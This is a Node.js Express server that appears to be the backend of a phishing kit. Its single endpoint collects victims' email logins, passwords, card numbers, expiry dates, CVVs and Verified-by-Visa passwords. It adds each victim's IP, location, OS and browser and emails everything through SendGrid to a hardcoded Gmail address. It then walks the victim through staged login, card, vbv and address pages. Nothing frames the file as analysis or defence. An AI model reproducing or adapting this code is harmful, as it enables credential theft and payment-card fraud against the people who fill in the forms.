const express = require('express');
const session = require('express-session');
const bodyParser = require('body-parser');
const sgMail = require('@sendgrid/mail');
const axios = require('axios');
const app = express();

// Initialize SendGrid
sgMail.setApiKey(process.env.SENDGRID_API_KEY);

// Middleware
app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());
app.use(session({
    secret: process.env.SESSION_SECRET || 'default-secret',
    resave: false,
    saveUninitialized: true,
    cookie: { secure: false }
}));

// CORS middleware
app.use((req, res, next) => {
    res.header('Access-Control-Allow-Origin', '*');
    res.header('Access-Control-Allow-Headers', 'Origin, X-Requested-With, Content-Type, Accept');
    next();
});

class DataCollector {
    static async getSystemInfo(req) {
        const userAgent = req.headers['user-agent'] || 'Unknown';
        const ip = req.ip || req.connection.remoteAddress || req.headers['x-forwarded-for'] || 'Unknown';
        
        // Get country from IP
        let country = 'Unknown';
        try {
            const response = await axios.get(`http://www.geoplugin.net/xml.gp?ip=${ip}`);
            const match = response.data.match(/<geoplugin_countryName>([^<]*)<\/geoplugin_countryName>/);
            country = match ? match[1] : 'Unknown';
        } catch (error) {
            country = 'Unknown';
        }

        // Get browser
        const browser = this.getBrowser(userAgent);
        
        // Get OS
        const os = this.getOS(userAgent);

        return {
            ip,
            country,
            browser,
            os,
            userAgent,
            timestamp: new Date().toUTCString()
        };
    }

    static getBrowser(userAgent) {
        if (userAgent.includes('Opera') || userAgent.includes('OPR/')) return 'Opera';
        if (userAgent.includes('Edge')) return 'Edge';
        if (userAgent.includes('Chrome')) return 'Chrome';
        if (userAgent.includes('Safari')) return 'Safari';
        if (userAgent.includes('Firefox')) return 'Firefox';
        if (userAgent.includes('MSIE') || userAgent.includes('Trident/7')) return 'Internet Explorer';
        return 'Other';
    }

    static getOS(userAgent) {
        const osList = [
            { regex: /windows nt 10/i, name: 'Windows 10' },
            { regex: /windows nt 6.3/i, name: 'Windows 8.1' },
            { regex: /windows nt 6.2/i, name: 'Windows 8' },
            { regex: /windows nt 6.1/i, name: 'Windows 7' },
            { regex: /windows nt 6.0/i, name: 'Windows Vista' },
            { regex: /windows nt 5.2/i, name: 'Windows Server 2003/XP x64' },
            { regex: /windows nt 5.1/i, name: 'Windows XP' },
            { regex: /windows xp/i, name: 'Windows XP' },
            { regex: /macintosh|mac os x/i, name: 'Mac OS X' },
            { regex: /linux/i, name: 'Linux' },
            { regex: /ubuntu/i, name: 'Ubuntu' },
            { regex: /iphone/i, name: 'iPhone' },
            { regex: /ipad/i, name: 'iPad' },
            { regex: /android/i, name: 'Android' }
        ];

        for (let os of osList) {
            if (os.regex.test(userAgent)) return os.name;
        }
        return 'Unknown OS';
    }

    static async sendEmail(data, type) {
        try {
            const systemInfo = await this.getSystemInfo(data.req);
            
            let message = `=== ${type.toUpperCase()} SUBMISSION ===\n`;
            message += `Timestamp: ${systemInfo.timestamp}\n`;
            message += `IP: ${systemInfo.ip}\n`;
            message += `Country: ${systemInfo.country}\n`;
            message += `OS: ${systemInfo.os}\n`;
            message += `Browser: ${systemInfo.browser}\n\n`;
            
            // Add form data
            message += `FORM DATA:\n`;
            Object.keys(data.formData).forEach(key => {
                if (data.formData[key]) {
                    message += `${key}: ${data.formData[key]}\n`;
                }
            });

            // Add session data if available
            if (data.sessionData && Object.keys(data.sessionData).length > 0) {
                message += `\nSESSION DATA:\n`;
                Object.keys(data.sessionData).forEach(key => {
                    if (data.sessionData[key] && !key.includes('cookie')) {
                        message += `${key}: ${data.sessionData[key]}\n`;
                    }
                });
            }

            const msg = {
                to: process.env.TO_EMAIL || 'congratulationspp@gmail.com',
                from: process.env.FROM_EMAIL || 'noreply@yourapp.com',
                subject: `Form Submission - ${type}`,
                text: message
            };

            await sgMail.send(msg);
            console.log(`Email sent for ${type}`);
            return true;
        } catch (error) {
            console.error('SendGrid error:', error);
            return false;
        }
    }
}

// Single endpoint for all submissions
app.post('/api/submit', async (req, res) => {
    try {
        const formData = req.body;
        
        // Store data in session based on what's provided
        if (formData.semail) req.session.EM = formData.semail;
        if (formData.Spassword) req.session.PW = formData.Spassword;
        if (formData.CardNumberInput) req.session.CARD = formData.CardNumberInput;
        if (formData.CardExpInput) req.session.Data = formData.CardExpInput;
        if (formData.CardcvvInput) req.session.CVV = formData.CardcvvInput;
        
        // Determine submission type
        let type = 'unknown';
        if (formData.semail && formData.Spassword) {
            type = 'login';
        } else if (formData.CardNumberInput) {
            type = 'card';
        } else if (formData.CVV || formData.password_vbv) {
            type = 'vbv';
        } else if (formData.FullNameInput) {
            type = 'address';
        }

        // Prepare data for email
        const emailData = {
            req,
            formData,
            sessionData: req.session,
            type
        };

        // Send email
        await DataCollector.sendEmail(emailData, type);

        // Return appropriate response
        res.json({ 
            status: 'success', 
            message: 'Data processed successfully',
            next: getNextStep(type)
        });

    } catch (error) {
        console.error('Submission error:', error);
        res.status(500).json({ 
            status: 'error', 
            message: 'Internal server error' 
        });
    }
});

function getNextStep(type) {
    const steps = {
        'login': '/card',
        'card': '/vbv', 
        'vbv': '/address',
        'address': '/complete',
        'unknown': '/'
    };
    return steps[type] || '/';
}

// Health check
app.get('/api/submit', (req, res) => {
    res.json({ 
        status: 'active', 
        message: 'Server is running',
        timestamp: new Date().toISOString()
    });
});

app.get('/health', (req, res) => {
    res.send('OK');
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});

module.exports = app;

